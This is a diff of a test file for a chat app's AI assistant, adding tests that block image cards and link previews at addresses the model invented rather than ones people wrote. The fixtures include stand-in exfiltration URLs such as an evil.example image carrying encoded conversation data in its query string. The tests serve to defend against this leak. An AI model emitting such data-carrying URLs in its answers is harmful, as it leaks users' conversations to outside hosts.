@@ -13,13 +13,14 @@ import {
   THREAD_REPLIES_READ,
   UNTHINKING_TOKENS,
   waitFor,
+  writtenBy,
 } from "../src/assistant/answers";
 import { markdownHtml } from "../src/bots/markdown";
-import { api, connect, cookieOf, freshDeploy, post, roomSql, settle, shown, startDirect, workspaceSql, type Client, type Session } from "./support";
+import { api, apiWith, connect, cookieOf, freshDeploy, post, roomSql, settle, shown, startDirect, workspaceSql, type Client, type Session } from "./support";
 
 // What @ember answers when someone asks it something: in the room or thread they asked in, having read
 // the conversation there, as rich text, with the pictures it shows in a card and a preview of its first
-// link, or a note saying why it can't, and only while Ember AI is on.
+// link, at addresses people wrote there, or a note saying why it can't, and only while Ember AI is on.
 
 const EMBER: User = { id: ASSISTANT_ID, name: ASSISTANT_NAME };
 /** A Workers AI model, which takes Chat Completions, whose turns AI Gateway is sent as they are. */
@@ -131,6 +132,13 @@ function internet(answer: (asked: Asked) => Response | Promise<Response>): Asked
   });
   return questions;
 }
+
+/** The hosts of what was fetched since `internet` stood in for the Internet, but AI Gateway, in order. */
+const fetchedHosts = () =>
+  vi
+    .mocked(globalThis.fetch)
+    .mock.calls.map(([input]) => new URL(input instanceof Request ? input.url : String(input)).hostname)
+    .filter((host) => host !== "api.cloudflare.com");
 
 /**
  * A model that answers `text` only once `answer` is called, waiting in the room's own I/O context, where
@@ -283,11 +291,12 @@ describe("@ember", () => {
     direct.close();
   });
 
-  it("shows the pictures its answer shows in a card under it, and a preview of its first web link below it", async () => {
+  it("shows the pictures its answer shows in a card under it, and a preview of its first web link below it, at addresses people wrote there", async () => {
     const { ada, general } = await setUp();
     internet(() => chatAnswer("Here's our logo:\n\n![The flame](https://images.example.com/flame.png)\n\nWrite to [us](mailto:team@example.com), or see [the guide](http://www.example.com/)."));
     const client = await connect(general, ada);
 
+    await post(client, "<p>The logo is at https://images.example.com/flame.png, and the guide at http://www.example.com/</p>");
     await post(client, `<p>${mention(EMBER)} show me the logo</p>`);
     const answer = await nextAnswer(client);
     expect(answer.cards).toEqual([{ source: "blocks", parts: [{ kind: "image", image: { url: "https://images.example.com/flame.png", alt: "The flame" } }] }]);
@@ -295,6 +304,37 @@ describe("@ember", () => {
     expect(answer.body).toContain(`<action-text-attachment content-type="${OPENGRAPH_EMBED_CONTENT_TYPE}"`);
     expect(answer.body).toContain("An example page.");
     expect(answer.plainText).toBe("Here's our logo:\n\nThe flame\n\nWrite to us, or see the guide.");
+    client.close();
+  });
+
+  it("shows no picture, and previews no link, at an address only its model, its own answer or a bot wrote, nor on Ember's own, fetching none", async () => {
+    const { ada, general } = await setUp();
+    const bot = await addBot(ada, "Chart Bot");
+    const usingDomain = await api("/api/account", { method: "PATCH", headers: { Cookie: ada.cookie }, body: JSON.stringify({ customDomain: "ember.test" }) });
+    expect(usingDomain.status, await usingDomain.clone().text()).toBe(200);
+    // A page opened where a deploy puts Ember tells it that address is its own too.
+    expect((await apiWith({}, "https://ember.example.workers.dev/api/bootstrap")).status).toBe(200);
+    // The first answer's plain text has the address it made up, as the second answer reads it.
+    const answers = [
+      "![The chart](https://charts.example.com/week.png) ![Made up](https://made-up.example/a.png?d=launch) See [the room](https://ember.test/rooms/1), or https://made-up.example/a.png?d=launch",
+      "Again: ![Made up](https://made-up.example/a.png?d=launch) https://made-up.example/a.png?d=launch, or [the room](https://ember.example.workers.dev/rooms/1).",
+    ];
+    internet(() => chatAnswer(answers.shift()!));
+    const client = await connect(general, ada);
+
+    const charted = await api(`/rooms/${general}/${bot.key}/messages`, { method: "POST", body: "<p>This week: https://charts.example.com/week.png</p>", headers: { "Content-Type": "text/html" } });
+    expect(charted.status).toBe(201);
+    await post(client, "<p>We're at https://ember.test/rooms/1 and https://ember.example.workers.dev/rooms/1</p>");
+    for (const question of ["what's new?", "and again?"]) {
+      await post(client, `<p>${mention(EMBER)} ${question}</p>`);
+      const answer = await nextAnswer(client);
+      expect(answer.cards).toBeUndefined();
+      expect(answer.body).not.toContain(OPENGRAPH_EMBED_CONTENT_TYPE);
+      // It's a link all the same, which nobody's app fetches unless they follow it.
+      expect(answer.body).toContain(`<a href="https://made-up.example/a.png?d=launch">Made up</a>`);
+    }
+    // Nothing was fetched but AI Gateway, so no host heard what the conversation says.
+    expect(fetchedHosts()).toEqual([]);
     client.close();
   });
 
@@ -464,7 +504,7 @@ describe("@ember", () => {
 
     const question = await post(client, `<p>${mention(EMBER)} hello?</p>`);
     expect(await nextAnswer(client)).toMatchObject({ creator: EMBER, plainText: NOTES.credits });
-    expect(errors).toHaveBeenCalledWith(expect.stringMatching(new RegExp(`^Ember AI's model didn't answer message ${question.id}: .*Insufficient credits`)));
+    expect(errors).toHaveBeenCalledWith(expect.stringMatching(new RegExp(`^Ember AI's model ${MODEL.replaceAll(".", "\\.")} didn't answer message ${question.id}: .*Insufficient credits`)));
     client.close();
   });
 
@@ -514,6 +554,24 @@ function message(id: string, plainText: string, changes: Partial<Message> = {}):
 const ADA: User = { id: "ada", name: "Ada Lovelace" };
 const IN_GENERAL = { community: "Fernwood", roomName: "general", inThread: false };
 const NOW = new Date("2026-10-31T12:00:00Z");
+
+describe("What people wrote in what @ember read", () => {
+  it("is the plain text of each message it read that one of them wrote, not its own answers, bots', or what's deleted", () => {
+    const long = "x".repeat(MAX_CONVERSATION_LENGTH - 100);
+    const conversation = [
+      message("1", long),
+      message("2", "https://example.com/build.png", { creator: { id: "bot", name: "Build Bot" } }),
+      message("3", "https://example.com/made-up.png", { creator: EMBER }),
+      message("4", "https://example.com/gone.png", { deleted: true }),
+      message("5", "https://example.com/chart.png", { creator: { id: "grace", name: "Grace Hopper" } }),
+      message("6", "@Ember show me"),
+    ];
+    const people = new Set(["ada", "grace"]);
+    // In the room, the first is too long to read with the rest; in a thread, where it's the first message, the oldest replies are.
+    expect(writtenBy(people, conversation, false)).toEqual(["https://example.com/chart.png", "@Ember show me"]);
+    expect(writtenBy(people, conversation, true)).toEqual([long, "https://example.com/chart.png", "@Ember show me"]);
+  });
+});
 
 describe("What @ember asks its model", () => {
   it("says who it is, where it's asked, by whom, and today's date, and labels the question with who asked", () => {
@@ -572,11 +630,55 @@ describe("@ember's answer", () => {
     expect(answerOf("Embers glow.").markup).toBe("<p>Embers glow.</p>");
   });
 
-  it("shows the web pictures it shows in a card, and has its first web link for a preview", () => {
-    const answer = answerOf("![A](https://example.com/a.png) ![B](data:image/png;base64,AAAA) [mail](mailto:a@example.com) <https://example.com/x?a=1&b=2> [y](https://example.com/y)");
+  it("shows the web pictures it shows in a card, and has its first web link for a preview, at addresses people wrote", () => {
+    const written = ["The logo: https://example.com/a.png", "See https://example.com/x?a=1&b=2 or https://example.com/y"];
+    const answer = answerOf("![A](https://example.com/a.png) ![B](data:image/png;base64,AAAA) [mail](mailto:a@example.com) <https://example.com/x?a=1&b=2> [y](https://example.com/y)", [], written);
     expect(answer.cards).toEqual([{ source: "blocks", parts: [{ kind: "image", image: { url: "https://example.com/a.png", alt: "A" } }] }]);
     expect(answer.firstLink).toBe("https://example.com/x?a=1&b=2");
     expect(answerOf("No links.")).toEqual({ markup: "<p>No links.</p>", cards: [], firstLink: null });
+  });
+
+  it("shows no picture, and has no link for a preview, at an address nobody wrote, nor a page it came from, which it links to all the same", () => {
+    const text = "![Made up](https://evil.example/t.gif?d=bGF1bmNo) [made up](https://evil.example/r?d=bGF1bmNo) [the page](https://example.com/page) ![Found](https://example.com/found.png)";
+    const answer = answerOf(text, [{ url: "https://example.com/found.png", title: "Found" }], ["Have a look at https://example.com/page"]);
+    expect(answer.cards).toEqual([{ source: "blocks", parts: [{ kind: "image", image: { url: "https://example.com/found.png", alt: "Found" } }] }]);
+    // Its first link nobody wrote, so its preview is of the next.
+    expect(answer.firstLink).toBe("https://example.com/page");
+    expect(answer.markup).toContain(`<a href="https://evil.example/t.gif?d=bGF1bmNo">Made up</a> <a href="https://evil.example/r?d=bGF1bmNo">made up</a>`);
+    expect(answerOf(text)).toMatchObject({ cards: [], firstLink: null });
+  });
+
+  /** Where the pictures in the card of the answer `text` makes go, and its link for a preview, when people wrote `written`. */
+  const fetchedFor = (text: string, written: readonly string[], ownHosts: readonly string[] = []) => {
+    const { cards, firstLink } = answerOf(text, [], written, ownHosts);
+    return [...cards.flatMap(({ parts }) => parts.map((part) => (part.kind === "image" ? part.image.url : ""))), firstLink];
+  };
+
+  it("takes an address people wrote as their message links to it, however the answer writes it, but nothing added to it", () => {
+    const written = ["Our site is https://example.com/, the forum www.example.com/forum, the logo https://example.com/logo.png and the shop https://shop.example/a&b"];
+    const shown = (text: string) => fetchedFor(text, written);
+    expect(shown("[It](https://example.com)")).toEqual(["https://example.com/"]);
+    expect(shown("See www.example.com/forum")).toEqual(["http://www.example.com/forum"]);
+    expect(shown("[The shop](https://shop.example/a&amp;b)")).toEqual(["https://shop.example/a&b"]);
+    expect(shown("![Logo](https://example.com/logo.png) [It](https://example.com/logo.png?d=bGF1bmNo)")).toEqual(["https://example.com/logo.png", null]);
+    expect(shown("![Logo](https://example.com/logo.png?d=bGF1bmNo) [It](https://other.example/logo.png)")).toEqual([null]);
+  });
+
+  it("takes only whole addresses, as the start of one people wrote can be another site's", () => {
+    const written = ["Our logo is at https://example.com.au/logo.png, and the guide at https://docs.example.com/guide?page=2."];
+    expect(fetchedFor("![Logo](https://example.com) [The guide](https://docs.example.com/guide)", written)).toEqual([null]);
+    expect(fetchedFor("![Logo](https://example.com.au/logo) [The docs](https://docs.example.co)", written)).toEqual([null]);
+    expect(fetchedFor("![Logo](https://example.com.au/logo.png) [The guide](https://docs.example.com/guide?page=2).", written)).toEqual([
+      "https://example.com.au/logo.png",
+      "https://docs.example.com/guide?page=2",
+    ]);
+  });
+
+  it("has the first link people wrote that isn't to Ember's own pages for a preview", () => {
+    const written = ["We're at https://ember.test/rooms/1 and http://localhost:8787/rooms/1, and the guide is at https://example.com/guide"];
+    const text = "See [the room](https://ember.test/rooms/1), [here](http://localhost:8787/rooms/1) or [the guide](https://example.com/guide).";
+    expect(fetchedFor(text, written, ["ember.test", "localhost:8787"])).toEqual(["https://example.com/guide"]);
+    expect(fetchedFor(text, written)).toEqual(["https://ember.test/rooms/1"]);
   });
 
   it("is cut, a line at a time, to what a message holds", () => {
